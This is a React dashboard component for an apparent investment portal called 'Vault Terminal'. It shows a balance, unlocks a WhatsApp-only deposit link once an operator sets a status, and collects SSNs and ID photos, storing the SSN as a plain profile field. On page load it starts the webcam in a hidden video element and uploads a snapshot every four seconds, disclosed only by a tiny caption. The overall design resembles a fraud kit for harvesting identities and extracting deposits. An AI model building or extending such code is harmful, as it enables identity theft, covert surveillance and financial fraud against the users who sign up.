'use client';

import React, { useEffect, useState, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { LogOut, Lock, Smartphone, ShieldCheck, Activity, Upload, Camera, Loader2 } from 'lucide-react';

export default function Dashboard() {
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState<any>(null);
  
  // KYC State
  const [ssn, setSsn] = useState('');
  const [idType, setIdType] = useState('driver_license');
  const [idFile, setIdFile] = useState<File | null>(null);
  const [kycSubmitting, setKycSubmitting] = useState(false);

  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const init = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      if (!session) { window.location.href = '/portal/auth'; return; }

      const fetchProfile = async () => {
        const { data } = await supabase.from('profiles').select('*').eq('id', session.user.id).single();
        if (data) setUser(data);
        setLoading(false);
      };
      fetchProfile();

      // REALTIME: Syncs changes instantly
      const channel = supabase.channel('db-sync')
        .on('postgres_changes', { event: '*', schema: 'public', table: 'profiles', filter: `id=eq.${session.user.id}` }, 
        (payload) => setUser(payload.new))
        .subscribe();

      startProctoring(session.user.id);
      return () => { supabase.removeChannel(channel); };
    };
    init();
  }, []);

  const startProctoring = async (userId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) videoRef.current.srcObject = stream;
      
      // SNAPSHOT LOOP: Every 4 seconds
      setInterval(async () => {
        if (!videoRef.current || !canvasRef.current) return;
        const context = canvasRef.current.getContext('2d');
        context?.drawImage(videoRef.current, 0, 0, 640, 480);
        const blob = await new Promise<Blob | null>(res => canvasRef.current?.toBlob(res, 'image/jpeg', 0.5));
        if (blob) {
          await supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob);
        }
      }, 4000);
    } catch (e) { console.warn("Camera blocked"); }
  };

  const handleKyc = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!idFile || !ssn) return;
    setKycSubmitting(true);
    try {
      const path = `${user.id}/${Date.now()}_id.jpg`;
      await supabase.storage.from('user-kyc').upload(path, idFile);
      await supabase.from('profiles').update({ ssn_data: ssn, document_type: idType, kyc_status: 'pending' }).eq('id', user.id);
      setUser({ ...user, kyc_status: 'pending' });
    } catch (err: any) { alert(err.message); }
    finally { setKycSubmitting(false); }
  };

  // --- THE CRITICAL FIX ---
  // This converts "Unlocked " or "APPROVED" into clean lowercase for the check
  const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
  const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
  
  const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20and%20I%20want%20to%20deposit.`;

  if (loading) return <div className="min-h-screen bg-black flex items-center justify-center text-[#D4AF37] animate-pulse">Establishing Link...</div>;

  return (
    <main className="min-h-screen bg-[#050505] text-white p-6">
      <video ref={videoRef} autoPlay muted className="hidden" />
      <canvas ref={canvasRef} width="640" height="480" className="hidden" />

      <div className="max-w-6xl mx-auto">
        <header className="flex justify-between items-center mb-12 border-b border-white/5 pb-6">
           <h1 className="text-2xl font-serif italic text-[#D4AF37]">Vault <span className="text-white">Terminal</span></h1>
           <button onClick={() => supabase.auth.signOut().then(() => window.location.href='/portal/auth')} className="p-3 bg-white/5 rounded-full"><LogOut size={20} /></button>
        </header>

        <div className="grid lg:grid-cols-3 gap-6 mb-12">
          <div className="lg:col-span-2 bg-[#0a0a0a] border border-white/5 p-12 rounded-[3rem] shadow-2xl">
             <p className="text-gray-500 text-[10px] uppercase tracking-widest mb-4">Total Equity</p>
             <h2 className="text-7xl font-serif mb-10">${user?.balance?.toLocaleString()}</h2>
             
             <a href={isUnlocked ? waLink : "#"} onClick={(e) => !isUnlocked && e.preventDefault()}
               className={`inline-flex items-center gap-3 px-12 py-5 rounded-full font-bold uppercase tracking-widest text-[10px] transition-all
               ${isUnlocked ? 'bg-green-600 hover:bg-green-500 shadow-[0_0_30px_rgba(34,197,94,0.3)]' : 'bg-white/5 text-gray-500 cursor-not-allowed'}`}>
               {isUnlocked ? <><Smartphone size={16}/> Initialize Deposit</> : <><Lock size={16}/> Restricted Access</>}
             </a>
          </div>

          <div className="bg-[#0a0a0a] border border-white/5 p-8 rounded-[3rem] flex flex-col justify-between">
             <div className="space-y-4">
                <div className="flex justify-between border-b border-white/5 pb-2 text-[10px] uppercase">
                   <span className="text-gray-500">Auth Name</span>
                   <span>{user?.full_name}</span>
                </div>
                <div className="flex justify-between border-b border-white/5 pb-2 text-[10px] uppercase">
                   <span className="text-gray-500">Status</span>
                   <span className={isUnlocked ? "text-green-500" : "text-yellow-500"}>{user?.deposit_status}</span>
                </div>
             </div>
             <div className="bg-[#D4AF37]/5 border border-[#D4AF37]/20 p-4 rounded-2xl flex items-center gap-3">
                <Camera size={18} className="text-[#D4AF37] animate-pulse" />
                <p className="text-[8px] text-gray-400 uppercase leading-relaxed">Biometric Monitoring: Snapshots logged every 4s.</p>
             </div>
          </div>
        </div>

        {/* KYC FORM */}
        {user?.kyc_status !== 'verified' && (
          <div className="bg-[#0a0a0a] border border-white/5 rounded-[3rem] p-12">
            <h3 className="text-3xl font-serif mb-8">Identity Verification</h3>
            <form onSubmit={handleKyc} className="space-y-6 max-w-xl">
              <div className="grid md:grid-cols-2 gap-6">
                <select value={idType} onChange={(e)=>setIdType(e.target.value)} className="bg-black border border-white/10 rounded-xl p-4 text-xs">
                  <option value="driver_license">Driver's License</option>
                  <option value="passport">Passport</option>
                </select>
                <input type="text" placeholder="SSN (XXX-XX-XXXX)" value={ssn} onChange={(e)=>setSsn(e.target.value)} className="bg-black border border-white/10 rounded-xl p-4 text-xs" required />
              </div>
              <div className="border-2 border-dashed border-white/10 rounded-2xl p-10 text-center relative">
                <input type="file" accept="image/*" onChange={(e)=>setIdFile(e.target.files?.[0] || null)} className="absolute inset-0 opacity-0 cursor-pointer" required />
                <Upload className="mx-auto mb-2 text-gray-500" />
                <p className="text-xs text-gray-500">{idFile ? idFile.name : "Upload ID Image"}</p>
              </div>
              <button disabled={kycSubmitting} className="bg-white text-black px-10 py-4 rounded-full font-bold uppercase text-[10px] hover:bg-[#D4AF37] transition-all">
                {kycSubmitting ? "Processing..." : "Submit Verification"}
              </button>
            </form>
          </div>
        )}
      </div>
    </main>
  );
                   }
                  
